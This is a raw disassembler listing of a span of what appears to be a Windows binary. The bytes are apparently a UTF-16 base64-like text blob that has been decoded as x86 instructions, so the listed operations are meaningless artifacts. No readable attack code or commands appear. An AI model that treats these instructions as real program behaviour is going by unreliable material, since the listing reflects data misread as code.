  404c36:	00 58 00             	add    %bl,0x0(%eax)
  404c39:	73 00                	jae    0x404c3b
  404c3b:	74 00                	je     0x404c3d
  404c3d:	38 00                	cmp    %al,(%eax)
  404c3f:	52                   	push   %edx
  404c40:	00 37                	add    %dh,(%edi)
  404c42:	00 61 00             	add    %ah,0x0(%ecx)
  404c45:	4c                   	dec    %esp
  404c46:	00 46 00             	add    %al,0x0(%esi)
  404c49:	48                   	dec    %eax
  404c4a:	00 71 00             	add    %dh,0x0(%ecx)
  404c4d:	35 00 37 00 4a       	xor    $0x4a003700,%eax
  404c52:	00 38                	add    %bh,(%eax)
  404c54:	00 4a 00             	add    %cl,0x0(%edx)
  404c57:	78 00                	js     0x404c59
  404c59:	44                   	inc    %esp
  404c5a:	00 4a 00             	add    %cl,0x0(%edx)
  404c5d:	30 00                	xor    %al,(%eax)
  404c5f:	46                   	inc    %esi
  404c60:	00 62 00             	add    %ah,0x0(%edx)
  404c63:	61                   	popa
  404c64:	00 66 00             	add    %ah,0x0(%esi)
  404c67:	35 00 35 00 46       	xor    $0x46003500,%eax
  404c6c:	00 79 00             	add    %bh,0x0(%ecx)
  404c6f:	4f                   	dec    %edi
  404c70:	00 36                	add    %dh,(%esi)
  404c72:	00 50 00             	add    %dl,0x0(%eax)
  404c75:	62 00                	bound  %eax,(%eax)
  404c77:	50                   	push   %eax
  404c78:	00 79 00             	add    %bh,0x0(%ecx)
  404c7b:	47                   	inc    %edi
  404c7c:	00 76 00             	add    %dh,0x0(%esi)
  404c7f:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  404c83:	56                   	push   %esi
  404c84:	00 6d 00             	add    %ch,0x0(%ebp)
  404c87:	56                   	push   %esi
  404c88:	00 43 00             	add    %al,0x0(%ebx)
  404c8b:	63 00                	arpl   %eax,(%eax)
  404c8d:	4a                   	dec    %edx
  404c8e:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  404c92:	00 6e 00             	add    %ch,0x0(%esi)
  404c95:	32 00                	xor    (%eax),%al
  404c97:	7a 00                	jp     0x404c99
  404c99:	70 00                	jo     0x404c9b
  404c9b:	53                   	push   %ebx
  404c9c:	00 53 00             	add    %dl,0x0(%ebx)
  404c9f:	74 00                	je     0x404ca1
  404ca1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ca2:	00 4a 00             	add    %cl,0x0(%edx)
  404ca5:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  404ca9:	45                   	inc    %ebp
  404caa:	00 36                	add    %dh,(%esi)
  404cac:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  404cb0:	00 49 00             	add    %cl,0x0(%ecx)
  404cb3:	74 00                	je     0x404cb5
  404cb5:	43                   	inc    %ebx
  404cb6:	00 4d 00             	add    %cl,0x0(%ebp)
  404cb9:	6b 00 35             	imul   $0x35,(%eax),%eax
  404cbc:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  404cc0:	00 4b 00             	add    %cl,0x0(%ebx)
  404cc3:	49                   	dec    %ecx
  404cc4:	00 52 00             	add    %dl,0x0(%edx)
  404cc7:	42                   	inc    %edx
  404cc8:	00 58 00             	add    %bl,0x0(%eax)
  404ccb:	61                   	popa
  404ccc:	00 33                	add    %dh,(%ebx)
  404cce:	00 55 00             	add    %dl,0x0(%ebp)
  404cd1:	4c                   	dec    %esp
  404cd2:	00 33                	add    %dh,(%ebx)
  404cd4:	00 65 00             	add    %ah,0x0(%ebp)
  404cd7:	54                   	push   %esp
  404cd8:	00 6d 00             	add    %ch,0x0(%ebp)
  404cdb:	67 00 36 00 4c       	add    %dh,0x4c00
  404ce0:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  404ce4:	00 75 00             	add    %dh,0x0(%ebp)
  404ce7:	34 00                	xor    $0x0,%al
  404ce9:	53                   	push   %ebx
  404cea:	00 71 00             	add    %dh,0x0(%ecx)
  404ced:	63 00                	arpl   %eax,(%eax)
  404cef:	63 00                	arpl   %eax,(%eax)
  404cf1:	78 00                	js     0x404cf3
  404cf3:	2b 00                	sub    (%eax),%eax
  404cf5:	44                   	inc    %esp
  404cf6:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  404cfa:	00 4d 00             	add    %cl,0x0(%ebp)
  404cfd:	46                   	inc    %esi
  404cfe:	00 6f 00             	add    %ch,0x0(%edi)
  404d01:	68 00 72 00 57       	push   $0x57007200
  404d06:	00 31                	add    %dh,(%ecx)
  404d08:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  404d0c:	00 50 00             	add    %dl,0x0(%eax)
  404d0f:	70 00                	jo     0x404d11
  404d11:	5a                   	pop    %edx
  404d12:	00 49 00             	add    %cl,0x0(%ecx)
  404d15:	6b 00 55             	imul   $0x55,(%eax),%eax
  404d18:	00 39                	add    %bh,(%ecx)
  404d1a:	00 6a 00             	add    %ch,0x0(%edx)
  404d1d:	74 00                	je     0x404d1f
  404d1f:	61                   	popa
  404d20:	00 5a 00             	add    %bl,0x0(%edx)
  404d23:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  404d27:	66 00 54 00 43       	data16 add %dl,0x43(%eax,%eax,1)
  404d2c:	00 78 00             	add    %bh,0x0(%eax)
  404d2f:	62 00                	bound  %eax,(%eax)
  404d31:	4c                   	dec    %esp
  404d32:	00 72 00             	add    %dh,0x0(%edx)
  404d35:	4f                   	dec    %edi
  404d36:	00 4b 00             	add    %cl,0x0(%ebx)
  404d39:	73 00                	jae    0x404d3b
  404d3b:	5a                   	pop    %edx
  404d3c:	00 65 00             	add    %ah,0x0(%ebp)
  404d3f:	42                   	inc    %edx
  404d40:	00 4b 00             	add    %cl,0x0(%ebx)
  404d43:	41                   	inc    %ecx
  404d44:	00 63 00             	add    %ah,0x0(%ebx)
  404d47:	42                   	inc    %edx
  404d48:	00 56 00             	add    %dl,0x0(%esi)
  404d4b:	68 00 2b 00 6f       	push   $0x6f002b00
  404d50:	00 4d 00             	add    %cl,0x0(%ebp)
  404d53:	69 00 4f 00 74 00    	imul   $0x74004f,(%eax),%eax
  404d59:	53                   	push   %ebx
  404d5a:	00 53 00             	add    %dl,0x0(%ebx)
  404d5d:	4b                   	dec    %ebx
  404d5e:	00 6e 00             	add    %ch,0x0(%esi)
  404d61:	72 00                	jb     0x404d63
  404d63:	4e                   	dec    %esi
  404d64:	00 46 00             	add    %al,0x0(%esi)
  404d67:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  404d6b:	61                   	popa
  404d6c:	00 2f                	add    %ch,(%edi)
  404d6e:	00 73 00             	add    %dh,0x0(%ebx)
  404d71:	48                   	dec    %eax
  404d72:	00 49 00             	add    %cl,0x0(%ecx)
  404d75:	38 00                	cmp    %al,(%eax)
  404d77:	62 00                	bound  %eax,(%eax)
  404d79:	52                   	push   %edx
  404d7a:	00 57 00             	add    %dl,0x0(%edi)
  404d7d:	4b                   	dec    %ebx
  404d7e:	00 39                	add    %bh,(%ecx)
  404d80:	00 69 00             	add    %ch,0x0(%ecx)
  404d83:	67 00 75 00          	add    %dh,0x0(%di)
  404d87:	35 00 44 00 77       	xor    $0x77004400,%eax
  404d8c:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  404d90:	00 47 00             	add    %al,0x0(%edi)
  404d93:	61                   	popa
  404d94:	00 79 00             	add    %bh,0x0(%ecx)
  404d97:	33 00                	xor    (%eax),%eax
  404d99:	31 00                	xor    %eax,(%eax)
  404d9b:	32 00                	xor    (%eax),%al
  404d9d:	55                   	push   %ebp
  404d9e:	00 4e 00             	add    %cl,0x0(%esi)
  404da1:	69 00 53 00 47 00    	imul   $0x470053,(%eax),%eax
  404da7:	53                   	push   %ebx
  404da8:	00 53 00             	add    %dl,0x0(%ebx)
  404dab:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  404daf:	54                   	push   %esp
  404db0:	00 30                	add    %dh,(%eax)
  404db2:	00 56 00             	add    %dl,0x0(%esi)
  404db5:	71 00                	jno    0x404db7
  404db7:	59                   	pop    %ecx
  404db8:	00 70 00             	add    %dh,0x0(%eax)
  404dbb:	38 00                	cmp    %al,(%eax)
  404dbd:	6c                   	insb   (%dx),%es:(%edi)
  404dbe:	00 70 00             	add    %dh,0x0(%eax)
  404dc1:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  404dc5:	31 00                	xor    %eax,(%eax)
  404dc7:	56                   	push   %esi
  404dc8:	00 75 00             	add    %dh,0x0(%ebp)
  404dcb:	4f                   	dec    %edi
  404dcc:	00 6a 00             	add    %ch,0x0(%edx)
  404dcf:	75 00                	jne    0x404dd1
  404dd1:	61                   	popa
  404dd2:	00 41 00             	add    %al,0x0(%ecx)
  404dd5:	57                   	push   %edi
  404dd6:	00 41 00             	add    %al,0x0(%ecx)
  404dd9:	2b 00                	sub    (%eax),%eax
  404ddb:	74 00                	je     0x404ddd
  404ddd:	44                   	inc    %esp
  404dde:	00 39                	add    %bh,(%ecx)
  404de0:	00 68 00             	add    %ch,0x0(%eax)
  404de3:	2b 00                	sub    (%eax),%eax
  404de5:	67 00 47 00          	add    %al,0x0(%bx)
  404de9:	74 00                	je     0x404deb
  404deb:	5a                   	pop    %edx
  404dec:	00 6f 00             	add    %ch,0x0(%edi)
  404def:	43                   	inc    %ebx
  404df0:	00 70 00             	add    %dh,0x0(%eax)
  404df3:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  404df7:	4c                   	dec    %esp
  404df8:	00 46 00             	add    %al,0x0(%esi)
  404dfb:	43                   	inc    %ebx
  404dfc:	00 62 00             	add    %ah,0x0(%edx)
  404dff:	76 00                	jbe    0x404e01
  404e01:	76 00                	jbe    0x404e03
  404e03:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  404e07:	4a                   	dec    %edx
  404e08:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  404e0c:	00 61 00             	add    %ah,0x0(%ecx)
  404e0f:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  404e13:	31 00                	xor    %eax,(%eax)
  404e15:	38 00                	cmp    %al,(%eax)
  404e17:	79 00                	jns    0x404e19
  404e19:	78 00                	js     0x404e1b
  404e1b:	30 00                	xor    %al,(%eax)
  404e1d:	6a 00                	push   $0x0
  404e1f:	62 00                	bound  %eax,(%eax)
  404e21:	34 00                	xor    $0x0,%al
  404e23:	6f                   	outsl  %ds:(%esi),(%dx)
  404e24:	00 72 00             	add    %dh,0x0(%edx)
  404e27:	30 00                	xor    %al,(%eax)
  404e29:	30 00                	xor    %al,(%eax)
  404e2b:	4b                   	dec    %ebx
  404e2c:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  404e30:	00 53 00             	add    %dl,0x0(%ebx)
  404e33:	2b 00                	sub    (%eax),%eax
  404e35:	46                   	inc    %esi
  404e36:	00 36                	add    %dh,(%esi)
  404e38:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  404e3c:	00 31                	add    %dh,(%ecx)
  404e3e:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  404e42:	00 49 00             	add    %cl,0x0(%ecx)
  404e45:	6c                   	insb   (%dx),%es:(%edi)
  404e46:	00 55 00             	add    %dl,0x0(%ebp)
  404e49:	35 00 55 00 56       	xor    $0x56005500,%eax
  404e4e:	00 63 00             	add    %ah,0x0(%ebx)
  404e51:	43                   	inc    %ebx
  404e52:	00 4a 00             	add    %cl,0x0(%edx)
  404e55:	4e                   	dec    %esi
  404e56:	00 45 00             	add    %al,0x0(%ebp)
  404e59:	68 00 53 00 34       	push   $0x34005300
  404e5e:	00 49 00             	add    %cl,0x0(%ecx)
  404e61:	67 00 65 00          	add    %ah,0x0(%di)
  404e65:	6b 00 71             	imul   $0x71,(%eax),%eax
  404e68:	00 57 00             	add    %dl,0x0(%edi)
  404e6b:	32 00                	xor    (%eax),%al
  404e6d:	38 00                	cmp    %al,(%eax)
  404e6f:	38 00                	cmp    %al,(%eax)
  404e71:	78 00                	js     0x404e73
  404e73:	46                   	inc    %esi
  404e74:	00 2b                	add    %ch,(%ebx)
  404e76:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  404e7a:	00 62 00             	add    %ah,0x0(%edx)
  404e7d:	56                   	push   %esi
  404e7e:	00 58 00             	add    %bl,0x0(%eax)
  404e81:	2b 00                	sub    (%eax),%eax
  404e83:	6b 00 38             	imul   $0x38,(%eax),%eax
  404e86:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  404e8a:	00 7a 00             	add    %bh,0x0(%edx)
  404e8d:	31 00                	xor    %eax,(%eax)
  404e8f:	30 00                	xor    %al,(%eax)
  404e91:	46                   	inc    %esi
  404e92:	00 70 00             	add    %dh,0x0(%eax)
  404e95:	37                   	aaa
  404e96:	00 48 00             	add    %cl,0x0(%eax)
  404e99:	41                   	inc    %ecx
  404e9a:	00 62 00             	add    %ah,0x0(%edx)
  404e9d:	69 00 4e 00 6e 00    	imul   $0x6e004e,(%eax),%eax
  404ea3:	30 00                	xor    %al,(%eax)
  404ea5:	76 00                	jbe    0x404ea7
  404ea7:	54                   	push   %esp
  404ea8:	00 32                	add    %dh,(%edx)
  404eaa:	00 66 00             	add    %ah,0x0(%esi)
  404ead:	32 00                	xor    (%eax),%al
  404eaf:	4c                   	dec    %esp
  404eb0:	00 77 00             	add    %dh,0x0(%edi)
  404eb3:	33 00                	xor    (%eax),%eax
  404eb5:	30 00                	xor    %al,(%eax)
  404eb7:	2f                   	das
  404eb8:	00 48 00             	add    %cl,0x0(%eax)
  404ebb:	7a 00                	jp     0x404ebd
  404ebd:	4e                   	dec    %esi
  404ebe:	00 41 00             	add    %al,0x0(%ecx)
  404ec1:	58                   	pop    %eax
  404ec2:	00 75 00             	add    %dh,0x0(%ebp)
  404ec5:	42                   	inc    %edx
  404ec6:	00 30                	add    %dh,(%eax)
  404ec8:	00 62 00             	add    %ah,0x0(%edx)
  404ecb:	56                   	push   %esi
  404ecc:	00 51 00             	add    %dl,0x0(%ecx)
  404ecf:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  404ed3:	54                   	push   %esp
  404ed4:	00 72 00             	add    %dh,0x0(%edx)
  404ed7:	35 00 72 00 37       	xor    $0x37007200,%eax
  404edc:	00 66 00             	add    %ah,0x0(%esi)
  404edf:	62 00                	bound  %eax,(%eax)
  404ee1:	6c                   	insb   (%dx),%es:(%edi)
  404ee2:	00 56 00             	add    %dl,0x0(%esi)
  404ee5:	75 00                	jne    0x404ee7
  404ee7:	35 00 75 00 5a       	xor    $0x5a007500,%eax
  404eec:	00 36                	add    %dh,(%esi)
  404eee:	00 70 00             	add    %dh,0x0(%eax)
  404ef1:	33 00                	xor    (%eax),%eax
  404ef3:	54                   	push   %esp
  404ef4:	00 58 00             	add    %bl,0x0(%eax)
  404ef7:	79 00                	jns    0x404ef9
  404ef9:	2f                   	das
  404efa:	00 30                	add    %dh,(%eax)
  404efc:	00 68 00             	add    %ch,0x0(%eax)
  404eff:	32 00                	xor    (%eax),%al
  404f01:	71 00                	jno    0x404f03
  404f03:	76 00                	jbe    0x404f05
  404f05:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  404f09:	67 00 56 00          	add    %dl,0x0(%bp)
  404f0d:	62 00                	bound  %eax,(%eax)
  404f0f:	4d                   	dec    %ebp
  404f10:	00 66 00             	add    %ah,0x0(%esi)
  404f13:	76 00                	jbe    0x404f15
  404f15:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  404f19:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  404f1d:	45                   	inc    %ebp
  404f1e:	00 4b 00             	add    %cl,0x0(%ebx)
  404f21:	2b 00                	sub    (%eax),%eax
  404f23:	42                   	inc    %edx
  404f24:	00 72 00             	add    %dh,0x0(%edx)
  404f27:	51                   	push   %ecx
  404f28:	00 6b 00             	add    %ch,0x0(%ebx)
  404f2b:	58                   	pop    %eax
  404f2c:	00 57 00             	add    %dl,0x0(%edi)
  404f2f:	52                   	push   %edx
  404f30:	00 7a 00             	add    %bh,0x0(%edx)
  404f33:	33 00                	xor    (%eax),%eax
  404f35:	55                   	push   %ebp
  404f36:	00 67 00             	add    %ah,0x0(%edi)
  404f39:	45                   	inc    %ebp
  404f3a:	00 59 00             	add    %bl,0x0(%ecx)
  404f3d:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  404f41:	51                   	push   %ecx
  404f42:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  404f46:	00 52 00             	add    %dl,0x0(%edx)
  404f49:	61                   	popa
  404f4a:	00 50 00             	add    %dl,0x0(%eax)
  404f4d:	7a 00                	jp     0x404f4f
  404f4f:	34 00                	xor    $0x0,%al
  404f51:	2b 00                	sub    (%eax),%eax
  404f53:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  404f57:	78 00                	js     0x404f59
  404f59:	36 00 30             	add    %dh,%ss:(%eax)
  404f5c:	00 41 00             	add    %al,0x0(%ecx)
  404f5f:	47                   	inc    %edi
  404f60:	00 55 00             	add    %dl,0x0(%ebp)
  404f63:	2f                   	das
  404f64:	00 30                	add    %dh,(%eax)
  404f66:	00 46 00             	add    %al,0x0(%esi)
  404f69:	6f                   	outsl  %ds:(%esi),(%dx)
  404f6a:	00 61 00             	add    %ah,0x0(%ecx)
  404f6d:	61                   	popa
  404f6e:	00 30                	add    %dh,(%eax)
  404f70:	00 4b 00             	add    %cl,0x0(%ebx)
  404f73:	48                   	dec    %eax
  404f74:	00 37                	add    %dh,(%edi)
  404f76:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  404f7a:	00 67 00             	add    %ah,0x0(%edi)
  404f7d:	6e                   	outsb  %ds:(%esi),(%dx)
  404f7e:	00 72 00             	add    %dh,0x0(%edx)
  404f81:	31 00                	xor    %eax,(%eax)
  404f83:	62 00                	bound  %eax,(%eax)
  404f85:	50                   	push   %eax
  404f86:	00 55 00             	add    %dl,0x0(%ebp)
  404f89:	4d                   	dec    %ebp
  404f8a:	00 47 00             	add    %al,0x0(%edi)
  404f8d:	34 00                	xor    $0x0,%al
  404f8f:	38 00                	cmp    %al,(%eax)
  404f91:	44                   	inc    %esp
  404f92:	00 4d 00             	add    %cl,0x0(%ebp)
  404f95:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  404f99:	2f                   	das
  404f9a:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  404f9e:	00 72 00             	add    %dh,0x0(%edx)
  404fa1:	47                   	inc    %edi
  404fa2:	00 4e 00             	add    %cl,0x0(%esi)
  404fa5:	47                   	inc    %edi
  404fa6:	00 62 00             	add    %ah,0x0(%edx)
  404fa9:	77 00                	ja     0x404fab
  404fab:	41                   	inc    %ecx
  404fac:	00 6e 00             	add    %ch,0x0(%esi)
  404faf:	71 00                	jno    0x404fb1
  404fb1:	51                   	push   %ecx
  404fb2:	00 75 00             	add    %dh,0x0(%ebp)
  404fb5:	37                   	aaa
  404fb6:	00 38                	add    %bh,(%eax)
  404fb8:	00 39                	add    %bh,(%ecx)
  404fba:	00 6e 00             	add    %ch,0x0(%esi)
  404fbd:	2f                   	das
  404fbe:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  404fc2:	00 76 00             	add    %dh,0x0(%esi)
  404fc5:	7a 00                	jp     0x404fc7
  404fc7:	35 00 38 00 31       	xor    $0x31003800,%eax
  404fcc:	00 52 00             	add    %dl,0x0(%edx)
  404fcf:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd0:	00 78 00             	add    %bh,0x0(%eax)
  404fd3:	44                   	inc    %esp
  404fd4:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  404fd8:	00 4f 00             	add    %cl,0x0(%edi)
  404fdb:	38 00                	cmp    %al,(%eax)
  404fdd:	75 00                	jne    0x404fdf
  404fdf:	54                   	push   %esp
  404fe0:	00 59 00             	add    %bl,0x0(%ecx)
  404fe3:	37                   	aaa
  404fe4:	00 45 00             	add    %al,0x0(%ebp)
  404fe7:	35 00 55 00 63       	xor    $0x63005500,%eax
  404fec:	00 6b 00             	add    %ch,0x0(%ebx)
  404fef:	66 00 78 00          	data16 add %bh,0x0(%eax)
  404ff3:	54                   	push   %esp
  404ff4:	00 33                	add    %dh,(%ebx)
  404ff6:	00 50 00             	add    %dl,0x0(%eax)
  404ff9:	46                   	inc    %esi
  404ffa:	00 34 00             	add    %dh,(%eax,%eax,1)
  404ffd:	76 00                	jbe    0x404fff
  404fff:	71 00                	jno    0x405001
  405001:	7a 00                	jp     0x405003
  405003:	45                   	inc    %ebp
  405004:	00 69 00             	add    %ch,0x0(%ecx)
  405007:	44                   	inc    %esp
  405008:	00 78 00             	add    %bh,0x0(%eax)
  40500b:	78 00                	js     0x40500d
  40500d:	39 00                	cmp    %eax,(%eax)
  40500f:	44                   	inc    %esp
  405010:	00 78 00             	add    %bh,0x0(%eax)
  405013:	63 00                	arpl   %eax,(%eax)
  405015:	7a 00                	jp     0x405017
  405017:	73 00                	jae    0x405019
  405019:	55                   	push   %ebp
  40501a:	00 4d 00             	add    %cl,0x0(%ebp)
  40501d:	74 00                	je     0x40501f
  40501f:	72 00                	jb     0x405021
  405021:	56                   	push   %esi
  405022:	00 45 00             	add    %al,0x0(%ebp)
  405025:	58                   	pop    %eax
  405026:	00 41 00             	add    %al,0x0(%ecx)
  405029:	32 00                	xor    (%eax),%al
  40502b:	7a 00                	jp     0x40502d
  40502d:	4f                   	dec    %edi
  40502e:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  405032:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  405036:	00 51 00             	add    %dl,0x0(%ecx)
  405039:	30 00                	xor    %al,(%eax)
  40503b:	6d                   	insl   (%dx),%es:(%edi)
  40503c:	00 46 00             	add    %al,0x0(%esi)
  40503f:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  405043:	61                   	popa
  405044:	00 59 00             	add    %bl,0x0(%ecx)
  405047:	61                   	popa
  405048:	00 65 00             	add    %ah,0x0(%ebp)
  40504b:	78 00                	js     0x40504d
  40504d:	50                   	push   %eax
  40504e:	00 68 00             	add    %ch,0x0(%eax)
  405051:	71 00                	jno    0x405053
  405053:	4b                   	dec    %ebx
  405054:	00 4b 00             	add    %cl,0x0(%ebx)
  405057:	48                   	dec    %eax
  405058:	00 71 00             	add    %dh,0x0(%ecx)
  40505b:	63 00                	arpl   %eax,(%eax)
  40505d:	55                   	push   %ebp
  40505e:	00 34 00             	add    %dh,(%eax,%eax,1)
  405061:	52                   	push   %edx
  405062:	00 4d 00             	add    %cl,0x0(%ebp)
  405065:	33 00                	xor    (%eax),%eax
  405067:	39 00                	cmp    %eax,(%eax)
  405069:	55                   	push   %ebp
  40506a:	00 43 00             	add    %al,0x0(%ebx)
  40506d:	52                   	push   %edx
  40506e:	00 30                	add    %dh,(%eax)
  405070:	00 67 00             	add    %ah,0x0(%edi)
  405073:	4d                   	dec    %ebp
  405074:	00 6a 00             	add    %ch,0x0(%edx)
  405077:	73 00                	jae    0x405079
  405079:	66 00 44 00 6f       	data16 add %al,0x6f(%eax,%eax,1)
  40507e:	00 36                	add    %dh,(%esi)
  405080:	00 62 00             	add    %ah,0x0(%edx)
  405083:	48                   	dec    %eax
  405084:	00 46 00             	add    %al,0x0(%esi)
  405087:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40508b:	63 00                	arpl   %eax,(%eax)
  40508d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405091:	4f                   	dec    %edi
  405092:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  405096:	00 35 00 50 00 30    	add    %dh,0x30005000
  40509c:	00 37                	add    %dh,(%edi)
  40509e:	00 62 00             	add    %ah,0x0(%edx)
  4050a1:	4e                   	dec    %esi
  4050a2:	00 50 00             	add    %dl,0x0(%eax)
  4050a5:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  4050a9:	55                   	push   %ebp
  4050aa:	00 77 00             	add    %dh,0x0(%edi)
  4050ad:	45                   	inc    %ebp
  4050ae:	00 47 00             	add    %al,0x0(%edi)
  4050b1:	53                   	push   %ebx
  4050b2:	00 2b                	add    %ch,(%ebx)
  4050b4:	00 6b 00             	add    %ch,0x0(%ebx)
  4050b7:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  4050ba:	00 59 00             	add    %bl,0x0(%ecx)
  4050bd:	53                   	push   %ebx
  4050be:	00 2b                	add    %ch,(%ebx)
  4050c0:	00 71 00             	add    %dh,0x0(%ecx)
  4050c3:	32 00                	xor    (%eax),%al
  4050c5:	37                   	aaa
  4050c6:	00 41 00             	add    %al,0x0(%ecx)
  4050c9:	46                   	inc    %esi
  4050ca:	00 43 00             	add    %al,0x0(%ebx)
  4050cd:	4d                   	dec    %ebp
  4050ce:	00 5a 00             	add    %bl,0x0(%edx)
  4050d1:	6b 00 41             	imul   $0x41,(%eax),%eax
  4050d4:	00 59 00             	add    %bl,0x0(%ecx)
  4050d7:	68 00 48 00 35       	push   $0x35004800
  4050dc:	00 57 00             	add    %dl,0x0(%edi)
  4050df:	6d                   	insl   (%dx),%es:(%edi)
  4050e0:	00 7a 00             	add    %bh,0x0(%edx)
  4050e3:	76 00                	jbe    0x4050e5
  4050e5:	45                   	inc    %ebp
  4050e6:	00 6d 00             	add    %ch,0x0(%ebp)
  4050e9:	33 00                	xor    (%eax),%eax
  4050eb:	59                   	pop    %ecx
  4050ec:	00 37                	add    %dh,(%edi)
  4050ee:	00 50 00             	add    %dl,0x0(%eax)
  4050f1:	78 00                	js     0x4050f3
  4050f3:	49                   	dec    %ecx
  4050f4:	00 5a 00             	add    %bl,0x0(%edx)
  4050f7:	73 00                	jae    0x4050f9
  4050f9:	50                   	push   %eax
  4050fa:	00 67 00             	add    %ah,0x0(%edi)
  4050fd:	56                   	push   %esi
  4050fe:	00 30                	add    %dh,(%eax)
  405100:	00 38                	add    %bh,(%eax)
  405102:	00 49 00             	add    %cl,0x0(%ecx)
  405105:	6c                   	insb   (%dx),%es:(%edi)
  405106:	00 4f 00             	add    %cl,0x0(%edi)
  405109:	4c                   	dec    %esp
  40510a:	00 6a 00             	add    %ch,0x0(%edx)
  40510d:	5a                   	pop    %edx
  40510e:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  405112:	00 39                	add    %bh,(%ecx)
  405114:	00 62 00             	add    %ah,0x0(%edx)
  405117:	6d                   	insl   (%dx),%es:(%edi)
  405118:	00 57 00             	add    %dl,0x0(%edi)
  40511b:	6b 00 44             	imul   $0x44,(%eax),%eax
  40511e:	00 37                	add    %dh,(%edi)
  405120:	00 36                	add    %dh,(%esi)
  405122:	00 76 00             	add    %dh,0x0(%esi)
  405125:	4f                   	dec    %edi
  405126:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40512a:	00 75 00             	add    %dh,0x0(%ebp)
  40512d:	47                   	inc    %edi
  40512e:	00 76 00             	add    %dh,0x0(%esi)
  405131:	2b 00                	sub    (%eax),%eax
  405133:	77 00                	ja     0x405135
  405135:	2b 00                	sub    (%eax),%eax
  405137:	47                   	inc    %edi
  405138:	00 6d 00             	add    %ch,0x0(%ebp)
  40513b:	33 00                	xor    (%eax),%eax
  40513d:	32 00                	xor    (%eax),%al
  40513f:	45                   	inc    %ebp
  405140:	00 70 00             	add    %dh,0x0(%eax)
  405143:	49                   	dec    %ecx
  405144:	00 38                	add    %bh,(%eax)
  405146:	00 73 00             	add    %dh,0x0(%ebx)
  405149:	76 00                	jbe    0x40514b
  40514b:	6f                   	outsl  %ds:(%esi),(%dx)
  40514c:	00 47 00             	add    %al,0x0(%edi)
  40514f:	70 00                	jo     0x405151
  405151:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  405155:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  405159:	73 00                	jae    0x40515b
  40515b:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40515f:	34 00                	xor    $0x0,%al
  405161:	31 00                	xor    %eax,(%eax)
  405163:	62 00                	bound  %eax,(%eax)
  405165:	63 00                	arpl   %eax,(%eax)
  405167:	31 00                	xor    %eax,(%eax)
  405169:	4f                   	dec    %edi
  40516a:	00 67 00             	add    %ah,0x0(%edi)
  40516d:	4b                   	dec    %ebx
  40516e:	00 35 00 64 00 45    	add    %dh,0x45006400
  405174:	00 49 00             	add    %cl,0x0(%ecx)
  405177:	50                   	push   %eax
  405178:	00 6e 00             	add    %ch,0x0(%esi)
  40517b:	6a 00                	push   $0x0
  40517d:	50                   	push   %eax
  40517e:	00 6b 00             	add    %ch,0x0(%ebx)
  405181:	76 00                	jbe    0x405183
  405183:	61                   	popa
  405184:	00 38                	add    %bh,(%eax)
  405186:	00 2f                	add    %ch,(%edi)
  405188:	00 53 00             	add    %dl,0x0(%ebx)
  40518b:	46                   	inc    %esi
  40518c:	00 4a 00             	add    %cl,0x0(%edx)
  40518f:	47                   	inc    %edi
  405190:	00 69 00             	add    %ch,0x0(%ecx)
  405193:	4a                   	dec    %edx
  405194:	00 45 00             	add    %al,0x0(%ebp)
  405197:	4c                   	dec    %esp
  405198:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40519c:	00 2f                	add    %ch,(%edi)
  40519e:	00 7a 00             	add    %bh,0x0(%edx)
  4051a1:	31 00                	xor    %eax,(%eax)
  4051a3:	48                   	dec    %eax
  4051a4:	00 70 00             	add    %dh,0x0(%eax)
  4051a7:	54                   	push   %esp
  4051a8:	00 69 00             	add    %ch,0x0(%ecx)
  4051ab:	51                   	push   %ecx
  4051ac:	00 4e 00             	add    %cl,0x0(%esi)
  4051af:	57                   	push   %edi
  4051b0:	00 6b 00             	add    %ch,0x0(%ebx)
